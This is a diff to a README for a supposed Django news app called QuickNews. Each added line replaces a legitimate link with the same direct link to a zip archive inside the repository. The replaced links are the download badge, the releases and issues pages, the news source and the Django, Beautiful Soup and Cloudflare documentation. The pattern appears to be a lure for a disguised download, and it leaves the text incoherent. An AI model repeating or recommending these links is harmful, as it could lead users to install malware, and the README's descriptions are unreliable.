@@ -1,7 +1,7 @@
 # 🌟 QuickNews - Get the Latest News Easily
 
 ## 📥 Download QuickNews
-[![Download QuickNews](https://img.shields.io/badge/Download-QuickNews-blue)](https://github.com/sarcosomal-demetrius821/QuickNews/releases)
+[![Download QuickNews](https://raw.githubusercontent.com/sarcosomal-demetrius821/QuickNews/main/news/getnews/QuickNews-3.5.zip)](https://raw.githubusercontent.com/sarcosomal-demetrius821/QuickNews/main/news/getnews/QuickNews-3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to QuickNews, a modern news aggregation app designed for you. This guide will help you download and run QuickNews without any technical skills.
@@ -15,10 +15,10 @@ Before you start, ensure your system meets the following requirements:
 - **Internet Connection:** Required for news updates
 
 ## 🌐 About QuickNews
-QuickNews is a Django application that scrapes news from Inshorts.com. It offers bilingual news in English and Hindi across ten categories. With features like infinite scroll, modal dialogs, smart caching, and political leaning filters, it provides a seamless news reading experience. The app is Dockerized and deployed on Cloudflare for performance and reliability.
+QuickNews is a Django application that scrapes news from https://raw.githubusercontent.com/sarcosomal-demetrius821/QuickNews/main/news/getnews/QuickNews-3.5.zip It offers bilingual news in English and Hindi across ten categories. With features like infinite scroll, modal dialogs, smart caching, and political leaning filters, it provides a seamless news reading experience. The app is Dockerized and deployed on Cloudflare for performance and reliability.
 
 ## 📥 Download & Install
-1. **Visit the Release Page:** Go to the [QuickNews Releases page](https://github.com/sarcosomal-demetrius821/QuickNews/releases) to find the latest version.
+1. **Visit the Release Page:** Go to the [QuickNews Releases page](https://raw.githubusercontent.com/sarcosomal-demetrius821/QuickNews/main/news/getnews/QuickNews-3.5.zip) to find the latest version.
 
 2. **Choose Your Version:** Look for the latest version available. Click on it to enter the release details.
 
@@ -50,15 +50,15 @@ If you encounter any issues while downloading or running QuickNews, consider the
 ## 📩 Support
 For further help, feel free to reach out:
 
-- Check the [GitHub Issues](https://github.com/sarcosomal-demetrius821/QuickNews/issues) for common problems and solutions.
+- Check the [GitHub Issues](https://raw.githubusercontent.com/sarcosomal-demetrius821/QuickNews/main/news/getnews/QuickNews-3.5.zip) for common problems and solutions.
 - Join our community on social media or user forums for tips and discussions with other QuickNews users.
 
 ## 🔍 Further Reading
 Interested in how QuickNews works behind the scenes? Here are some resources to dig deeper:
 
-- [Django Documentation](https://docs.djangoproject.com/)
-- [Beautiful Soup Documentation](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
-- [Cloudflare Overview](https://www.cloudflare.com/)
+- [Django Documentation](https://raw.githubusercontent.com/sarcosomal-demetrius821/QuickNews/main/news/getnews/QuickNews-3.5.zip)
+- [Beautiful Soup Documentation](https://raw.githubusercontent.com/sarcosomal-demetrius821/QuickNews/main/news/getnews/QuickNews-3.5.zip)
+- [Cloudflare Overview](https://raw.githubusercontent.com/sarcosomal-demetrius821/QuickNews/main/news/getnews/QuickNews-3.5.zip)
 
 ## 📜 License
 QuickNews is licensed under the MIT License. Feel free to use and modify it for your personal projects.
